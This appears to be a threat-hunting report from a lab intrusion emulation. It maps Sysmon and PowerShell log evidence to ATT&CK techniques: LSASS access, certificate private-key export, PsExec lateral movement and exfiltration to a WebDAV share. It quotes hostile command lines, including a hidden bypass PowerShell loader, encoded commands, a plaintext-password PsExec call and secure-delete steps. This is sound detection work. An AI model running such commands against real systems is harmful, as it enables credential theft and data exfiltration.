| 3 | 2020-05-02 03:11:40.213Z | nashua.dmevals.local | windows.sysmon | process.command_line | "C:\Windows\Temp\python.exe"  | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoz4j7h | q-f1a9799dd1 | ok |
| 4 | 2020-05-02 03:16:19.395Z | nashua.dmevals.local | windows.sysmon | process.command_line | "C:\Windows\Temp\Rar.exe" a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBow1qSj | q-9a8b0adc29 | ok |
| 5 | 2020-05-02 03:17:41.290Z | nashua.dmevals.local | windows.sysmon | process.command_line | .\sdelete64.exe  /accepteula "C:\Users\pbeesly\Desktop\working.zip" | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnts2nD | q-4d48c28f45 | ok |

### F58 · malicious / high · T1552.001 · accesschk wrote passwordsDB on scranton; plaintext password passed to PsExec for NASHUA

Evidence status: **verified**

accesschk.exe created C:\Program Files\SysinternalsSuite\passwordsDB at 03:04:35Z and PsExec64 was run four times with '-p Fl0nk3rt0n!T0by' against NASHUA.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:35.069Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Program Files\SysinternalsSuite\passwordsDB | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoNRGHl | q-c2294b39a9 | ok |
| 2 | 2020-05-02 03:11:18.784Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoz4z4i | q-c10848084d | ok |

### F60 · malicious / high · T1552.004 · Exported private keys packed into 7z and pushed to attacker WebDAV

Evidence status: **verified**

Invoke-Exfil on scranton compressed Downloads (with the .pfx keys) into OfficeSupplies.7z and copied it to \\192.168.0.4\webdav.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-8e44141b1c | ok |
| 2 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-8e44141b1c | ok |

### F65 · malicious / high · T1555 · Certificate private-key export from LocalMachine store

Evidence status: **verified**

Get-PrivateKeys on scranton exported certificate private keys to .pfx files.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-3d671a92da | ok |

### F57 · malicious / high · T1555.004 · Get-PrivateKeys exported LocalMachine certs to .pfx on scranton

Evidence status: **verified**

At 03:04:56Z pbeesly's PowerShell ran Get-PrivateKeys, exporting every LocalMachine certificate with private key to a password-protected .pfx in Downloads.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-3d671a92da | ok |
| 2 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQkXH | q-8179237d64 | ok |

### F34 · malicious / high · T1556 · In-memory PowerShell loader (reflective GetProcAddress/ReflectedDelegate) and steganographic launcher on scranton, followed by full-access LSASS handle

Evidence status: **NOT verified (7/8 evidence items)** — excluded from the verdict

On scranton.dmevals.local, user pbeesly ran a hidden PowerShell launcher (PID 2976, parent control.exe) that decoded a payload from a bitmap (C:\Users\pbeesly\Downloads\monkey.png) and IEX'd it at 02:58:44Z. At 03:05:16Z that same PowerShell.exe (PID 2976) opened lsass.exe with GrantedAccess 0x1f3fff and 0x1fffff, with a CallTrace ending in UNKNOWN(000001996D28200D) — code not backed by any loaded module, the signature of an in-memory/reflective loader touching the authentication process. At 03:21:28-29Z a second chain ran: powershell.exe -c "Get-ItemPropertyValue 'HKLM:\\SOFTWARE\Javasoft' 'value Supplement' \| Invoke-Expression" (parent hostui.exe) spawned a hidden -nop -w hidden -e base64 child, and 4104 script blocks show a reflective loader using Microsoft.Win32.UnsafeNativeMethods GetProcAddress/GetModuleHandle plus DefineDynamicAssembly 'ReflectedDelegate' and a Base64 PE. This is attacker tooling operating on the authentication process; no evidence of a persistent authentication backdoor (no registry/DC changes) was found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-6389c67233 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|UNKNOWN(000001996D28200D) | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-6389c67233 | ok |
| 3 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-6389c67233 | ok |
| 4 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.command_line | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBorwtwa | q-9d45570d88 | ok |
| 5 | 2020-05-02 03:21:29.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function jzI {  	Param ($yKR, $cq)		  	$vvA = ([AppDomain]::CurrentDomain.GetAssemblies() \| Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByKWlPk | q-8a6dbda72f | ok |
| 6 | 2020-05-02 03:21:29.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function jzI {  	Param ($yKR, $cq)		  	$vvA = ([AppDomain]::CurrentDomain.GetAssemblies() \| Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByKWlPk | q-8a6dbda72f | ok |
| 7 | 2020-05-02 03:21:28.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-ItemPropertyValue 'HKLM:\\SOFTWARE\Javasoft' 'value Supplement' \| Invoke-Expression | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByKWUg0 | q-8a6dbda72f | ok |
| 8 | 2020-05-02 03:21:28.949Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbg… | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBjA9g2o | q-0eb449a32b | FAILED: claimed value differs from the stored value |

### F35 · malicious / medium · T1556.001 · Remote PowerShell (WinRM) session on nashua opened LSASS with 0x1f3fff and UNKNOWN call-trace frames

Evidence status: **verified**

On nashua.dmevals.local, wsmprovhost.exe (PID 7720, the WinRM host started at 03:09:23Z under user pbeesly) opened lsass.exe (PID 728) with GrantedAccess 0x1f3fff at 03:09:29Z; the CallTrace runs through System.ni.dll and Microsoft.PowerShell.Commands.Management.ni.dll and ends in five UNKNOWN(00007FFA...) frames, indicating unbacked code in the PowerShell process reading the authentication process. This is remote PowerShell activity against LSASS, not a modification of DC authentication (no 5136/4739/4657 directory or policy changes were observed).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\wsmprovhost.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBn663fz | q-29f5cf4a09 | ok |
| 2 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBn663fz | q-29f5cf4a09 | ok |
| 3 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|C:\windows\assembly\NativeImages_v4.0.30319_64\System\9803982d7bc887e2745bff18a43… | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBn663fz | q-29f5cf4a09 | ok |
| 4 | 2020-05-02 03:09:23.885Z | nashua.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\wsmprovhost.exe -Embedding | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBo05D7L | q-f15523822c | ok |

### F45 · malicious / medium · T1558 · Credential theft on scranton/nashua by pbeesly (LSASS access, private-key export) — no Kerberos ticket abuse observed

Evidence status: **verified**

On 2020-05-02 the account pbeesly ran a hands-on-keyboard intrusion from scranton.dmevals.local (cmd.exe spawned by C:\ProgramData\victim\...cod.3aka3.scr, then PowerShell with Invoke-Discovery / Invoke-Persistence / Invoke-Exfil / Invoke-BeachCleanup, Sysinternals suite, sdelete64). Credential-access steps were observed: PowerShell.exe (PID 2976) opened lsass.exe with GrantedAccess 0x1f3fff and 0x1fffff at 03:05:16 on scranton, and a Get-PrivateKeys function exported machine certificate private keys to .pfx files. Lateral movement to nashua.dmevals.local used PSEXESVC (service installed 4x by pbeesly) launching C:\Windows\Temp\python.exe, and a WinRM session (wsmprovhost.exe) opened lsass.exe with 0x1f3fff at 03:09:29 on nashua. However, no Kerberos ticket theft/forging artefact was found: the only 4769 events are normal TGS requests by pbeesly and machine accounts (all RC4 0x12, status 0x0), the krbtgt service tickets are ordinary TGT renewals from 10.0.1.4, and no golden/silver/kerberoast/AS-REP tooling appears in PowerShell script blocks. The credential access is real but the T1558 sub-techniques are not evidenced.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-36db0d9b23 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-36db0d9b23 | ok |
| 3 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\wsmprovhost.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBn663fz | q-20df235257 | ok |
| 4 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBn663fz | q-20df235257 | ok |
| 5 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-982ddcb2e7 | ok |
| 6 | 2020-05-02 03:11:40.213Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoz4j7h | q-e035c10ee5 | ok |
| 7 | 2020-05-02 02:56:04.510Z | scranton.dmevals.local | windows.sysmon | process.parent.executable | C:\ProgramData\victim\â€®cod.3aka3.scr | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBov08Fg | q-e035c10ee5 | ok |

### F51 · malicious / high · T1606.001 · No web-cookie forgery; instead LSASS credential theft via hidden PowerShell on scranton.dmevals.local

Evidence status: **verified**

On scranton.dmevals.local, user DMEVALS\pbeesly ran a hidden, execution-policy-bypassing PowerShell (PID 2976, launched by control.exe /name Microsoft.BackupAndRestoreCenter) that decoded a payload from a bitmap (monkey.png) and IEX'd it. That process then opened lsass.exe (PID 736) with GrantedAccess 0x1f3fff and 0x1fffff at 2020-05-02T03:05:16, i.e. credential material was read from LSASS memory. The same session exported every LocalMachine certificate private key to .pfx files (Get-PrivateKeys, Export-PfxCertificate with password 'saribas'), producing C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx, then compressed Downloads into C:\Users\pbeesly\AppData\Roaming\OfficeSupplies.7z and copied it to \\192.168.0.4\webdav via a mapped PSDrive using hardcoded credentials (cozy). This is credential access and exfiltration, not cookie forgery: no cookie store was read or modified and no forged cookie was used. The single cookie-path file creation in the dataset is a benign LocalService INetCookies path written by svchost.exe.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-e9c5af6947 | ok |
| 2 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXF | q-e9c5af6947 | ok |
| 3 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.command_line | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBorwtwa | q-674cf96cc1 | ok |
| 4 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-41ad45e396 | ok |
| 5 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQkXH | q-cfd6a7fdbb | ok |
| 6 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-33509e0bd6 | ok |
| 7 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Windows\ServiceProfiles\LocalService\AppData\Local\Packages\warp_jit_db4a1097-b484-4973-bbf2-a04208ecd4d4\AC\INetCookies | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi-6ySm | q-09b8fda0d2 | ok |

### F52 · malicious / medium · T1606.002 · No SAML token forgery; certificate private keys were exported for theft, not used to mint tokens

Evidence status: **verified**

No SAML token forging was observed: no 4104 script block contains SAML, Assertion or NotOnOrAfter, no process command line references saml/token/cert, and the Zeek window (2020-04-30, non-overlapping with the Windows window) has no saml/adfs/token HTTP URLs. What did occur on scranton.dmevals.local as DMEVALS\pbeesly is the theft of the raw material that token forgery would need: Get-PrivateKeys enumerated cert:\LocalMachine and exported every certificate with a thumbprint to password-protected .pfx files in Downloads (e.g. coyn5igj.3io.pfx at 2020-05-02T03:04:57), and the same session had already read LSASS with GrantedAccess 0x1fffff. The .pfx files were then bundled into OfficeSupplies.7z and pushed to \\192.168.0.4\webdav. This is certificate/credential theft (T1552.004/T1555 territory) rather than SAML token forgery, so the technique itself is not confirmed.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-41ad45e396 | ok |
| 2 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQkXH | q-cfd6a7fdbb | ok |
| 3 | 2020-05-02 03:08:35.270Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\AppData\Roaming\OfficeSupplies.7z | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBo05T5k | q-cfd6a7fdbb | ok |
| 4 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-e9c5af6947 | ok |

### F54 · malicious / high · T1649 · PowerShell Get-PrivateKeys script exported all LocalMachine certificates to password-protected .pfx files on scranton.dmevals.local

Evidence status: **verified**

On 2020-05-02 at 03:04:56 UTC, in the context of user pbeesly (SID S-1-5-21-1830255721-3727074217-2423397540-1107) on scranton.dmevals.local, PowerShell (PID 3876) executed a script block defining function Get-PrivateKeys, loaded from the masquerading path C:\Program Files\SysinternalsSuite\readme.ps1 (ScriptBlock ID 9d153741-75c3-4062-afe3-aeca0aee611b). The script enumerates cert:\LocalMachine recursively, and for every certificate with a thumbprint calls Export-PfxCertificate with a hardcoded password ("saribas") to a randomly named file under $env:USERPROFILE\Downloads. One second later Sysmon recorded the resulting file C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx created by the same powershell.exe (PID 3876), and Sysmon registry-write events show that same powershell.exe touching HKLM\SOFTWARE\Microsoft\SystemCertificates\MY\Certificates\48B5E43D09D080DF8863152FD22ED7C43443D499\Blob and the Remote Desktop certificate store on scranton. This is direct theft of authentication certificates/private keys for later use (e.g. certificate-based authentication or code signing). The activity is part of a broader intrusion on scranton by pbeesly (obfuscated hidden PowerShell, IEX of bitmap-decoded payload, SysinternalsSuite.zip download, hostui.exe runas).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-00feeea6f7 | ok |
| 2 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\readme.ps1 | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-1cad785809 | ok |
| 3 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-1cad785809 | ok |
| 4 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQkXH | q-7d1d999a71 | ok |
| 5 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQkXH | q-b8b8161acb | ok |
| 6 | 2020-05-02 03:04:57.428Z | scranton.dmevals.local | windows.sysmon | registry.path | HKLM\SOFTWARE\Microsoft\SystemCertificates\MY\Certificates\48B5E43D09D080DF8863152FD22ED7C43443D499\Blob | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQkXN | q-6ccd0b7d23 | ok |
| 7 | 2020-05-02 03:04:57.272Z | scranton.dmevals.local | windows.sysmon | registry.path | HKLM\SOFTWARE\Microsoft\SystemCertificates\Remote Desktop\Certificates\615B93C2D2B647D1670500B3338EAAEC83BA5646\Blob | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoNQ2BV | q-6ccd0b7d23 | ok |

### F62 · malicious / high · T1649 · Certificate private keys exported for theft on scranton

Evidence status: **verified**

Get-PrivateKeys exported all LocalMachine certificates to password-protected .pfx files that were then archived and exfiltrated.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-PrivateKeys | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLrb | q-3d671a92da | ok |
| 2 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQkXH | q-8179237d64 | ok |

### F61 · suspicious / medium · T1003.001 · powershell.exe opened LSASS on scranton during the theft session

Evidence status: **verified**

At 03:01:03Z powershell.exe opened lsass.exe with 0x1000 via managed System.ni.dll frames; no dump file was written.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:01:03.622Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1000 | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoXbqWA | q-dcbf9d42a4 | ok |
| 2 | 2020-05-02 03:01:03.622Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoXbqWA | q-dcbf9d42a4 | ok |

### F09 · suspicious / medium · T1056.004 · Hidden-window PowerShell (PID 2976) opened LSASS with full access 0x1FFFFF on scranton.dmevals.local

Evidence status: **verified**

On scranton.dmevals.local, a hidden-window PowerShell (PID 2976, launched 2020-05-02T02:58:44Z by control.exe with '-noni -noexit -ep bypass -window hidden -c' and a steganographic loader that reads pixels from C:\Users\pbeesly\Downloads\monkey.png and IEXes the decoded string) requested handles to lsass.exe (PID 736) with GrantedAccess 0x1F3FFF at 03:05:16.623Z and 0x1FFFFF at 03:05:16.654Z, with an UNKNOWN call trace outside ntdll/KERNELBASE. Full-access LSASS handles from a hidden, obfuscated PowerShell are consistent with credential API hooking / in-memory credential theft. Caveat: no MiniDump or explicit hooking API was observed, and the same process also opened winlogon.exe with 0x1000, so intent is inferred rather than proven. Other LSASS full-access opens in the window (wininit.exe, csrss.exe, svchost.exe via lsm.dll, WindowsAzureTelemetryService.exe, AntimalwareConfig.exe, wsmprovhost.exe via System.Management.Automation) are OS/service behaviour and were assessed benign.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-5fd6257508 | ok |
| 2 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXF | q-765d210fc9 | ok |
| 3 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|UNKNOWN(000001996D252982) | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXF | q-765d210fc9 | ok |
| 4 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXF | q-765d210fc9 | ok |
| 5 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXF | q-765d210fc9 | ok |

### F64 · suspicious / medium · T1212 · Managed-code LSASS access from PowerShell on scranton

Evidence status: **verified**

powershell.exe opened LSASS with 0x1000 through System.ni.dll during the hands-on-keyboard session; no protocol exploit seen.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:01:03.622Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1000 | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoXbqWA | q-dcbf9d42a4 | ok |

### F29 · suspicious / medium · T1552.006 · GptTmpl.inf read from NEWYORK sysvol by two external hosts, and GroupPolicy DataStore writes by svchost

Evidence status: **verified**

Zeek smb_files on 2020-04-30 shows two non-domain hosts (10.0.1.4 via observer simplerockbuild.simplerock.lan at 00:12:01 and 10.0.1.6 via observer bobs.bigwheel.local at 00:20:49) opening \\NEWYORK.dmevals.local\sysvol and reading dmevals.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf (1098 bytes) - the SYSVOL security-template file that can carry account/privilege settings. In the Windows window, the same GptTmpl.inf and gpt.ini paths appear only as Sysmon 11 creations by svchost.exe under C:\Windows\System32\GroupPolicy\DataStore on scranton and nashua, which is routine Group Policy processing. No Groups.xml/cpassword access was observed. The zeek window does not overlap the Windows data, so the SYSVOL reads cannot be tied to the pbeesly activity, but they are the only SYSVOL credential-relevant access seen.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:12:01.673Z | simplerockbuild.simplerock.lan | zeek | zeek.name | dmevals.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeBwkgh8M | q-b2a6091aee | ok |
